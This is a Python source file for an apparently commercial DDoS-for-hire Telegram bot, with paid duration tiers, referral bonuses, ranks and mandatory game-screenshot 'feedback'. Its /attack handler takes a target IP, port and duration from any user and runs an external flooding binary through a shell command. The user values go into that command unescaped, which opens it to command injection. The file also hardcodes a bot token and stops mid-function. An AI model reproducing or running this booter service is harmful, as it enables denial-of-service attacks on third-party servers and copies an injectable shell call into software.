#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import requests
import hashlib
import sys
import logging
import aiohttp  # Added from first script for completeness

# Setup logging
logging.basicConfig(filename='bot.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Telegram bot token
bot = telebot.TeleBot('7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70')

# Overlord/Admin user IDs
overlord_id = ["1866961136", "1807014348"]  # From both scripts

# Group and channel details
GROUP_IDS = ["-1002328886935", "-1002669651081"]  # @freeddos_group12 and Vip Hacker Ddos
CHANNEL_IDS = ["-1002308316749"]  # @ddos_server69 from second script
GROUP_USERNAME = "@freeddos_group12"
CHANNEL_USERNAME = "@DDOS_SERVER69"  # Consistent casing from first script
SUPPORT_CONTACT = "@Sadiq9869"
PURCHASE_CONTACT = "@Rohan2349"

# Default settings
COOLDOWN_TIME = 15  # Default from second script, configurable
ATTACK_LIMIT = 10   # Default from second script, configurable
USER_MAX_DURATION = 180  # Default for regular users
USER_OVERLORD_DURATION = 600  # Default for overlords
PAID_USER_DURATION = 600  # Default for paid users
MAX_REFERRAL_BONUS = 5  # Max extra strikes from referrals

# Global attack status
global_attack_running = False
overlord_attack_running = False
attack_lock = threading.Lock()
overlord_attack_lock = threading.Lock()
global_last_attack_time = None
global_pending_attack = None  # From first script

# Files for persistent storage
USER_FILE = "users.txt"
FEEDBACK_HASH_FILE = "feedback_hashes.txt"
REFERRAL_FILE = "referrals.txt"
HISTORY_FILE = "attack_history.txt"
RANK_FILE = "ranks.txt"
PAID_USERS_FILE = "paid_users.txt"

# Data structures
user_data = {}
feedback_hashes = set()
referral_data = {}
attack_history = {}
user_ranks = {}
PAID_USERS = {}  # user_id -> expiry datetime
pending_feedback = {}
feedback_count_dict = {}

# Rank system from second script
RANKS = {
    0: "Rookie Operative 🐣👶",
    10: "Cyber Enforcer 🛡️💂",
    25: "Thunder Soldier ⚔️🪖",
    50: "Elite Striker 🌟✨",
    100: "Thunder Lord 👑🔥"
}

# Daily missions from second script
DAILY_MISSIONS = {
    "attacks": {"task": "Launch 3 Attacks 🚀💥", "count": 3, "reward": 1},
    "invites": {"task": "Invite 1 Friend 📩🤝", "count": 1, "reward": 1}
}

# Random image URLs (combined from both scripts, duplicates removed)
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7O.jpg", "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg", "https://envs.sh/gH4.jpg", "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg", "https://envs.sh/gH1.jpg", "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg", "https://envs.sh/67E.jpg", "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg", "https://envs.sh/68V.jpg", "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg", "https://envs.sh/Vwe.jpg", "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg", "https://envs.sh/VwK.jpg", "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg", "https://envs.sh/Vwc.jpg"
]

# Example feedback images from second script
EXAMPLE_FEEDBACK_IMAGE_1 = "https://example.com/bgmi_feedback_677ping.jpg"
EXAMPLE_FEEDBACK_IMAGE_2 = "https://example.com/bgmi_feedback_lobby.jpg"

# Custom emojis from second script
custom_emojis = ["⚡", "🌩️", "🔥", "💥", "🎯", "⏳", "📸", "✅", "❌", "🛑", "💾", "🌐", "🔋"]

# Branded footer
def branded_footer():
    return f"\n\n⚡ **Powered by {GROUP_USERNAME}** ⚡\n🌩️ **Command Hub:** {CHANNEL_USERNAME} 📡"

# Price list from second script
PRICE_LIST = (
    "🌩️ **THUNDER ARSENAL - UNLEASH YOUR POWER!** 🌩️💎\n"
    "⚡ **Free Users Stuck at {USER_MAX_DURATION}s? Get 600s + Unlimited Attacks Now!** ⚡\n\n"
    "💰 **POWER-UP PLANS** 💰\n"
    "✨ **1 DAY STRIKE CORE**: ₹150 - *First Strike Free!* 🎁\n"
    "✨ **3 DAY STORM MODULE**: ₹350 - *+1 Day Free!* 🆓\n"
    "✨ **7 DAY THUNDER CORE**: ₹799 - *+3 Days Free for First 50 Buyers!* 🎉\n"
    "✨ **15 DAY LIGHTNING GRID**: ₹1599 - *+5 Days Free + VIP Badge!* 🏆\n"
    "✨ **30 DAY STORM KING**: ₹4000 - *+7 Days Free!* 💖\n"
    "✨ **60 DAY EMPEROR’S WRATH**: ₹7999 - *+12 Days Free!* 💝\n\n"
    "🔥 **LIMITED TIME OFFER**: 1H DDOS for ₹20! 🔥\n"
    "💥 **Super Effective - Dominate Instantly!** 💥\n\n"
    "👑 **Ready to Rule? Buy Now from {PURCHASE_CONTACT}!** 👑\n"
    f"{branded_footer()}"
)

# Utility functions
def is_user_in_group(user_id):
    try:
        member = bot.get_chat_member(GROUP_IDS[0], user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_IDS[0], user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def is_paid_user(user_id):
    if user_id in PAID_USERS:
        expiry = PAID_USERS[user_id]
        if datetime.datetime.now() < expiry:
            return True
        else:
            del PAID_USERS[user_id]
            save_paid_users()
    return False

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None,
                    'referral_bonus': 0,
                    'mission_attacks': 0,
                    'mission_invites': 0,
                    'mission_reset': datetime.datetime.now()
                }
    except FileNotFoundError:
        pass

def load_feedback_hashes():
    try:
        with open(FEEDBACK_HASH_FILE, "r") as file:
            for line in file:
                feedback_hashes.add(line.strip())
    except FileNotFoundError:
        pass

def load_referrals():
    try:
        with open(REFERRAL_FILE, "r") as file:
            for line in file:
                user_id, count = line.strip().split(',')
                referral_data[user_id] = int(count)
    except FileNotFoundError:
        pass

def load_attack_history():
    try:
        with open(HISTORY_FILE, "r") as file:
            for line in file:
                user_id, target, port, duration, status, timestamp = line.strip().split(',')
                if user_id not in attack_history:
                    attack_history[user_id] = []
                attack_history[user_id].append({
                    'target': target,
                    'port': port,
                    'duration': int(duration),
                    'status': status,
                    'timestamp': datetime.datetime.fromisoformat(timestamp)
                })
    except FileNotFoundError:
        pass

def load_ranks():
    try:
        with open(RANK_FILE, "r") as file:
            for line in file:
                user_id, points = line.strip().split(',')
                user_ranks[user_id] = int(points)
    except FileNotFoundError:
        pass

def load_paid_users():
    try:
        with open(PAID_USERS_FILE, "r") as file:
            for line in file:
                user_id, expiry = line.strip().split(',')
                PAID_USERS[user_id] = datetime.datetime.fromisoformat(expiry)
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def save_feedback_hash(image_hash):
    with open(FEEDBACK_HASH_FILE, "a") as file:
        file.write(f"{image_hash}\n")
    feedback_hashes.add(image_hash)

def save_referrals():
    with open(REFERRAL_FILE, "w") as file:
        for user_id, count in referral_data.items():
            file.write(f"{user_id},{count}\n")

def save_attack_history():
    with open(HISTORY_FILE, "w") as file:
        for user_id, history in attack_history.items():
            for entry in history:
                file.write(f"{user_id},{entry['target']},{entry['port']},{entry['duration']},"
                           f"{entry['status']},{entry['timestamp'].isoformat()}\n")

def save_ranks():
    with open(RANK_FILE, "w") as file:
        for user_id, points in user_ranks.items():
            file.write(f"{user_id},{points}\n")

def save_paid_users():
    with open(PAID_USERS_FILE, "w") as file:
        for user_id, expiry in PAID_USERS.items():
            file.write(f"{user_id},{expiry.isoformat()}\n")

def get_user_rank(user_id):
    points = user_ranks.get(user_id, 0)
    rank = "Rookie Operative 🐣👶"
    for threshold, rank_name in sorted(RANKS.items(), reverse=True):
        if points >= threshold:
            rank = rank_name
            break
    return rank, points

def update_user_rank(user_id, points_to_add):
    user_ranks[user_id] = user_ranks.get(user_id, 0) + points_to_add
    save_ranks()
    rank, points = get_user_rank(user_id)
    if points_to_add > 0:
        bot.send_message(user_id, 
                         f"🎖️ **Rank Update!** 🎖️\n"
                         f"⚡ **New Rank:** {rank} 🌟\n"
                         f"💾 **Thunder Points:** {points} 📊\n"
                         f"🌩️ **Keep Striking!** 🌩️\n"
                         f"{branded_footer()}")

def hash_image(file_id):
    try:
        file_info = bot.get_file(file_id)
        file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
        response = requests.get(file_url)
        image_data = response.content
        return hashlib.sha256(image_data).hexdigest()
    except Exception as e:
        logging.error(f"Error hashing image: {e}")
        return None

def set_message_reaction(chat_id, message_id, emoji):
    url = f"https://api.telegram.org/bot{bot.token}/setMessageReaction"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": emoji}],
        "is_big": True
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            logging.error(f"Failed to set reaction: {response.text}")
    except Exception as e:
        logging.error(f"Error setting reaction: {e}")

def simulate_attack(chat_id, target, port, time_duration, remaining_attacks, user_name, is_overlord=False, is_paid=False):
    global global_attack_running, overlord_attack_running
    interval = time_duration / 10
    profile_photos = bot.get_user_profile_photos(chat_id)
    profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None
    random_image = random.choice(image_urls)
    if profile_pic:
        bot.send_photo(chat_id, profile_pic, caption=f"👤 **User:** @{user_name} 🚀\n"
                                                     f"💥 **ATTACK STARTED!** 💥\n"
                                                     f"🎯 **Target:** `{target}:{port}`\n"
                                                     f"⏳ **Duration:** {time_duration}s\n"
                                                     f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                                                     f"📸 **Game Screenshot De!**\n"
                                                     f"⏳ **Progress: 0%**\n"
                                                     f"{branded_footer()}")
    for progress in range(0, 101, 10):
        time.sleep(interval)
        remaining_time = int(time_duration - (progress / 100 * time_duration))
        bot.send_message(chat_id, 
                         f"🌩️ **Thunder Strike Update!** 🌩️\n"
                         f"🎯 **Target:** `{target}:{port}` 🔒\n"
                         f"⏳ **Time Left:** {remaining_time}s ⏰\n"
                         f"⚡ **Progress:** {progress}% 📈\n"
                         f"{branded_footer()}")
    bot.send_message(chat_id, 
                     f"✅ **Target Destroyed!** ✅\n"
                     f"🎯 `{target}:{port}` 🔥\n"
                     f"⏳ **Duration:** {time_duration}s ⏰\n"
                     f"⚡ **Remaining Strikes:** {remaining_attacks} 💣\n"
                     f"⏳ **Progress:** 100% 🏁\n"
                     f"{branded_footer()}")
    if is_overlord:
        with overlord_attack_lock:
            overlord_attack_running = False
    elif not is_paid:
        with attack_lock:
            global_attack_running = False

def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            if user_id not in overlord_id:
                user_data[user_id]['attacks'] = 0
                user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

def auto_promotion():
    while True:
        for group_id in GROUP_IDS:
            try:
                bot.send_message(group_id, 
                    f"🌩️ **Thunder Command Calls!** 🌩️\n"
                    f"💥 **Free Users: {USER_MAX_DURATION}s & {ATTACK_LIMIT} Attacks/Day!** 💥\n"
                    f"💎 **Upgrade to Thunder Arsenal: 600s, Unlimited Power!** 💎\n"
                    f"📜 **Plans Start at ₹150!** /start 📋\n"
                    f"👑 **Buy from {PURCHASE_CONTACT}!** 👑\n"
                    f"{branded_footer()}",
                    parse_mode="Markdown")
            except Exception as e:
                logging.error(f"Error in auto-promotion: {e}")
        time.sleep(300)  # 5 minutes

# Command handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }
    command = message.text.split()
    if len(command) > 1:
        referrer_id = command[1]
        if referrer_id in referral_data and referrer_id != user_id:
            referral_data[referrer_id] = referral_data.get(referrer_id, 0) + 1
            user_data[referrer_id]['mission_invites'] += 1
            if user_data[referrer_id].get('referral_bonus', 0) < MAX_REFERRAL_BONUS:
                user_data[referrer_id]['referral_bonus'] += 1
                bot.send_message(referrer_id, 
                                 f"🎉 **New Recruit!** 🎉\n"
                                 f"⚡ **+1 Strike!** ⚡\n"
                                 f"💥 **Total Bonus:** {user_data[referrer_id]['referral_bonus']} 🎁\n"
                                 f"{branded_footer()}")
            update_user_rank(referrer_id, 2)
            save_referrals()
            save_users()
    response = (
        f"🌟🔥 **BHAI, WELCOME!** 🔥🌟\n"
        f"🚀 **YOU'RE IN THE HOME OF POWER!** 🚀\n"
        f"💥 **THE WORLD’S BEST DDOS BOT!** 💥\n"
        f"⚡ **BE THE KING, DOMINATE THE WEB!** ⚡\n"
        f"🔗 **TO USE THIS BOT, JOIN NOW:**\n"
        f"👉 [TELEGRAM GROUP](https://t.me/DDOS_SERVER69) 🚀🔥\n\n"
        f"{PRICE_LIST}"
    )
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)
    if not is_overlord and not is_paid and not (is_user_in_group(user_id) and is_user_in_channel(user_id)):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} & {CHANNEL_USERNAME} Pehle!** 🌪️\n{branded_footer()}")
        return
    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }
    user = user_data[user_id]
    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks)
    referral_count = referral_data.get(user_id, 0)
    rank, points = get_user_rank(user_id)
    status = "Overlord 👑" if is_overlord else ("Thunder Arsenal 💎" if is_paid else "Free Operative 🐣")
    bot.reply_to(message, 
                 f"👤 **Profile: {user_name}** 👤\n"
                 f"🆔 **ID:** `{user_id}`\n"
                 f"⚡ **Status:** {status}\n"
                 f"🎖️ **Rank:** {rank}\n"
                 f"💾 **Points:** {points}\n"
                 f"💥 **Strikes Used:** {total_attacks}\n"
                 f"🎁 **Bonus Strikes:** {user.get('referral_bonus', 0)}\n"
                 f"⚡ **Remaining:** {remaining_attacks}\n"
                 f"📩 **Invites:** {referral_count}\n"
                 f"⏳ **Last Reset:** {user['last_reset'].strftime('%Y-%m-%d %H:%M:%S')}\n"
                 f"💎 **Unlimited Power: /start** 💎\n"
                 f"{branded_footer()}")

@bot.message_handler(commands=['missions'])
def daily_missions(message):
    user_id = str(message.from_user.id)
    if not (user_id in overlord_id or is_paid_user(user_id) or (is_user_in_group(user_id) and is_user_in_channel(user_id))):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} & {CHANNEL_USERNAME} Pehle!** 🌪️\n{branded_footer()}")
        return
    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }
    user = user_data[user_id]
    now = datetime.datetime.now()
    if (now - user['mission_reset']).days >= 1:
        user['mission_attacks'] = 0
        user['mission_invites'] = 0
        user['mission_reset'] = now
        save_users()
    bot.reply_to(message, 
                 f"📜 **Daily Missions** 📜\n\n"
                 f"🎯 **{DAILY_MISSIONS['attacks']['task']}**: {user['mission_attacks']}/{DAILY_MISSIONS['attacks']['count']} (+{DAILY_MISSIONS['attacks']['reward']} Strike)\n"
                 f"📩 **{DAILY_MISSIONS['invites']['task']}**: {user['mission_invites']}/{DAILY_MISSIONS['invites']['count']} (+{DAILY_MISSIONS['invites']['reward']} Strike)\n"
                 f"⏳ **Reset:** {user['mission_reset'].replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)}\n"
                 f"💎 **Skip Limits: /start** 💎\n"
                 f"{branded_footer()}")

@bot.message_handler(commands=['history'])
def attack_history_command(message):
    user_id = str(message.from_user.id)
    if not (user_id in overlord_id or is_paid_user(user_id) or (is_user_in_group(user_id) and is_user_in_channel(user_id))):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} & {CHANNEL_USERNAME} Pehle!** 🌪️\n{branded_footer()}")
        return
    if user_id not in attack_history or not attack_history[user_id]:
        bot.reply_to(message, f"📜 **Koi Strikes Nahi!** 📜\n⚡ **Abhi Attack Kar!** ⚡\n{branded_footer()}")
        return
    history = attack_history[user_id][-5:]
    history_text = "\n".join([f"🎯 **{entry['target']}:{entry['port']}** | {entry['duration']}s | {entry['status']} | {entry['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}" 
                              for entry in history])
    bot.reply_to(message, f"📜 **Last 5 Strikes** 📜\n\n{history_text}\n\n💎 **More Power: /start** 💎\n{branded_footer()}")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_attack_running, overlord_attack_running, global_last_attack_time
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    if not is_overlord and not is_paid and str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    if not is_overlord and not is_paid and not (is_user_in_group(user_id) and is_user_in_channel(user_id)):
        bot.reply_to(message, f"❗ **BHAI, PAHLE JOIN KRO!** 🔥\n🔗 **Join Here:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    if not is_overlord and not is_paid and pending_feedback.get(user_id, False):
        bot.reply_to(message, f"😡 **BHAI, SCREENSHOT DE PAHLE!** 🔥\n🚀 **AGLA ATTACK LAGANE KE LIYE SABIT KRO KI PIC DALI!**\n{branded_footer()}")
        return

    if len(command) != 4:
        bot.reply_to(message, f"⚠️ **BHAI, USAGE:** /attack `<IP>` `<PORT>` `<TIME>`\n{branded_footer()}")
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, f"❌ **BHAI, PORT AUR TIME INTEGER HONI CHAHIYE!**\n{branded_footer()}")
        return

    max_duration = USER_OVERLORD_DURATION if is_overlord else (PAID_USER_DURATION if is_paid else USER_MAX_DURATION)
    if time_duration > max_duration:
        bot.reply_to(message, f"🚫 **BHAI, MAX DURATION = {max_duration}s!**\n💎 **Upgrade Kar: /start** 💎\n{branded_footer()}")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }
    user = user_data[user_id]
    now = datetime.datetime.now()
    if (now - user['last_reset']).days >= 1:
        user['attacks'] = 0
        user['last_reset'] = now
        save_users()

    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks
    if not (is_overlord or is_paid) and remaining_attacks <= 0:
        bot.reply_to(message, f"❌ **BHAI, ATTACK LIMIT OVER!** ❌\n🔄 **KAL PHIR TRY KAR!**\n💎 **Unlimited Ke Liye: /start** 💎\n{branded_footer()}")
        return
    if not (is_overlord or is_paid) and user['last_attack'] and (now - user['last_attack']).total_seconds() < COOLDOWN_TIME:
        remaining_cooldown = int(COOLDOWN_TIME - (now - user['last_attack']).total_seconds())
        bot.reply_to(message, f"⏳ **BHAI, COOLDOWN: {remaining_cooldown}s BAKI HAI!** ⏳\n💎 **No Cooldown: /start** 💎\n{branded_footer()}")
        return

    if is_overlord:
        with overlord_attack_lock:
            if overlord_attack_running:
                bot.reply_to(message, f"⚡ **BHAI, EK OVERLORD ATTACK CHAL RAHA HAI!** ⚡\n{branded_footer()}")
                return
            overlord_attack_running = True
    elif not is_paid:
        with attack_lock:
            if global_attack_running:
                bot.reply_to(message, f"⚡ **BHAI, EK ATTACK PEHLE SE CHAL RAHA HAI!** ⚡\n{branded_footer()}")
                return
            global_attack_running = True

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count == 0 and not (is_overlord or is_paid):
        bot.reply_to(message, f"❌ **BHAI, PROFILE PIC LAGA TO ATTACK KAR!**\n{branded_footer()}")
        if not (is_overlord or is_paid):
            with attack_lock:
                global_attack_running = False
        return

    full_command = f"./Rohan {target} {port} {time_duration} 512 1200"
    try:
        subprocess.run(full_command, shell=True, check=True)
        status = "Completed ✅"
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **BHAI, ERROR:** {e} ❌\n🛠️ **Help: {SUPPORT_CONTACT}**\n{branded_footer()}")
        if not (is_overlord or is_paid):
            with attack_lock:
                global_attack_running = False
        return

    user['last_attack'] = now
    user['attacks'] += 1
    user['mission_attacks'] += 1
    global_last_attack_time = now
    save_users()

    if user_id not in attack_history:
        attack_history[user_id] = []
    attack_history[user_id].append({
        'target': target,
        'port': port,
        'duration': time_duration,
        'status': status,
        'timestamp': now
    })
    save_attack_history()
    update_user_rank(user_id, 1)

    if user['mission_attacks'] >= DAILY_MISSIONS['attacks']['count']:
        user['referral_bonus'] += DAILY_MISSIONS['attacks']['reward']
        user['mission_attacks'] = 0
        bot.send_message(user_id, f"🎉 **MISSION PURA!** 🎉\n📜 **{DAILY_MISSIONS['attacks']['task']}** ✅\n🎁 **+{DAILY_MISSIONS['attacks']['reward']} Strike!**\n{branded_footer()}")
        save_users()

    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - (user['attacks'] - user.get('referral_bonus', 0)))
    threading.Thread(target=simulate_attack, args=(message.chat.id, target, port, time_duration, remaining_attacks, user_name, is_overlord, is_paid)).start()

    if not (is_overlord or is_paid):
        pending_feedback[user_id] = True
        bot.send_message(user_id, f"📸 **BHAI, BGMI SCREENSHOT BHEJ!** 📸\n💥 **AGLA ATTACK KE LIYE ZAROORI!** 💥\n💎 **Skip Karne Ke Liye: /start** 💎\n{branded_footer()}")

@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    if not pending_feedback.get(user_id, False):
        bot.reply_to(message, f"❌ **BHAI, ABHI FEEDBACK KI ZAROORAT NAHI!** ❌\n⚡ **PEHLE ATTACK KAR!** ⚡\n{branded_footer()}")
        return
    if user_id in overlord_id or is_paid_user(user_id):
        bot.reply_to(message, f"❌ **BHAI, TERE LIYE FEEDBACK NAHI CHAHIYE!** ❌\n⚡ **PAID YA OVERLORD HAI TU!** ⚡\n{branded_footer()}")
        return
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    image_hash = hash_image(message.photo[-1].file_id)
    if not image_hash or image_hash in feedback_hashes:
        bot.reply_to(message, f"❌ **BHAI, NAYA SCREENSHOT BHEJ! YE PURANA HAI YA GALAT HAI!** ❌\n🛠️ **Help: {SUPPORT_CONTACT}**\n{branded_footer()}")
        return
    feedback_count = feedback_count_dict.get(user_id, 0) + 1
    feedback_count_dict[user_id] = feedback_count
    save_feedback_hash(image_hash)
    pending_feedback[user_id] = False
    bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
    bot.send_message(CHANNEL_USERNAME, 
                     f"📸 **BHAI, FEEDBACK MIL GAYA!** 📸\n"
                     f"👤 **User:** `{user_name}`\n"
                     f"🆔 **ID:** `{user_id}`\n"
                     f"🔢 **SS No.:** `{feedback_count}`\n"
                     f"{branded_footer()}")
    bot.reply_to(message, f"✅ **BHAI, FEEDBACK ACCEPT HO GAYA! AB ATTACK KAR!** ✅\n{branded_footer()}")
    set_message_reaction(message.chat.id, message.message_id, "✅")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    user_commands = (
        "📜 **User Commands** 📜\n"
        "⚡ /start - Shuru Kar!\n"
        "⚡ /myinfo - Apna Stats Dekh!\n"
        "⚡ /missions - Roz Ka Kaam!\n"
        "⚡ /history - Last 5 Attacks!\n"
        "⚡ /attack <IP> <PORT> <TIME> - Attack Kar!\n"
        "⚡ /invite - Dost Ko Bula!\n"
        "⚡ /leaderboard - Top Bulane Wale!\n"
        "⚡ /check_cooldown - Cooldown Check!\n"
        "⚡ /check_remaining_attack - Bache Hue Attacks!\n"
    )
    overlord_commands = (
        "👑 **Overlord Commands** 👑\n"
        "⚡ /stats - Bot Ki Info!\n"
        "⚡ /broadcast <message> - Sabko Bol!\n"
        "⚡ /stop - Attack Rok!\n"
        "⚡ /setcooldown <seconds> - Cooldown Set Kar!\n"
        "⚡ /setmaxattack <limit> - Attack Limit Set!\n"
        "⚡ /setmaxtime <user> <overlord> - Time Set!\n"
        "⚡ /reset <user_id> - User Reset!\n"
        "⚡ /viewusers - Sab Users Dekh!\n"
        "⚡ /shutdown - Bot Band Kar!\n"
    )
    bot.reply_to(message, f"{user_commands}\n{overlord_commands if user_id in overlord_id else ''}💎 **Power Badhao: /start** 💎\n{branded_footer()}", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **Sirf Overlords Ke Liye!** ❌\n{branded_footer()}")
        return
    total_users = len(user_data)
    total_attacks = sum(len(attacks) for attacks in attack_history.values())
    active_paid_users = sum(1 for user in PAID_USERS if is_paid_user(user))
    bot.reply_to(message, f"📊 **Bot Stats** 📊\n👥 Users: {total_users}\n💥 Attacks: {total_attacks}\n💎 Paid Users: {active_paid_users}\n{branded_footer()}")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **Sirf Overlords Ke Liye!** ❌\n{branded_footer()}")
        return
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, f"❌ **Usage: /broadcast <message>** ❌\n{branded_footer()}")
        return
    broadcast_message = command[1]
    for uid in user_data:
        try:
            bot.send_message(uid, f"📢 **Overlord Ka Sandesh** 📢\n{broadcast_message}\n{branded_footer()}")
        except Exception as e:
            logging.error(f"Error broadcasting to {uid}: {e}")
    bot.reply_to(message, f"✅ **Broadcast Bhej Diya!** ✅\n{branded_footer()}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **Sirf Overlords Ke Liye!** ❌\n{branded_footer()}")
        return
    stopped = False
    with attack_lock:
        if global_attack_running:
            global_attack_running = False
            stopped = True
            bot.reply_to(message, f"🛑 **Free Users Ka Attack Ruk Gaya!** 🛑\n{branded_footer()}")
    with overlord_attack_lock:
        if overlord_attack_running:
            overlord_attack_running = False
            stopped = True
            bot.reply_to(message, f"🛑 **Overlord Ka Attack Ruk Gaya!** 🛑\n{branded_footer()}")
    if not stopped:
        bot.reply_to(message, f"⚡ **Koi Attack Chal Nahi Raha!** ⚡\n{branded_footer()}")

@bot.message_handler(commands=['invite'])
def invite_link(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    if not (user_id in overlord_id or is_paid_user(user_id) or is_user_in_group(user_id)):
        bot.reply_to(message, f"🌪️ **Pehle {GROUP_USERNAME} Join Kar!** 🌪️\n{branded_footer()}")
        return
    invite_link = f"https://t.me/DDOS_SERVER69?start={user_id}"
    bot.reply_to(message, f"📩 **{user_name} Ka Invite Link!** 📩\n🔗 {invite_link}\n🎁 +1 Strike Har Invite Pe (Max {MAX_REFERRAL_BONUS})!\n{branded_footer()}")

@bot.message_handler(commands=['leaderboard'])
def leaderboard(message):
    user_id = str(message.from_user.id)
    if not (user_id in overlord_id or is_paid_user(user_id) or is_user_in_group(user_id)):
        bot.reply_to(message, f"🌪️ **Pehle {GROUP_USERNAME} Join Kar!** 🌪️\n{branded_footer()}")
        return
    if not referral_data:
        bot.reply_to(message, f"🏆 **Leaderboard Khali Hai!** 🏆\n⚡ **Doston Ko Bula!** ⚡\n{branded_footer()}")
        return
    sorted_referrals = sorted(referral_data.items(), key=lambda x: x[1], reverse=True)[:5]
    leaderboard_text = "\n".join([f"🏅 {idx+1}. ID: {uid} | Invites: {count}" for idx, (uid, count) in enumerate(sorted_referrals)])
    bot.reply_to(message, f"🏆 **Top Bulane Wale** 🏆\n\n{leaderboard_text}\n\n⚡ **Aur Bulao!** ⚡\n{branded_footer()}")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    user_id = str(message.from_user.id)
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    if user_id in overlord_id or is_paid_user(user_id):
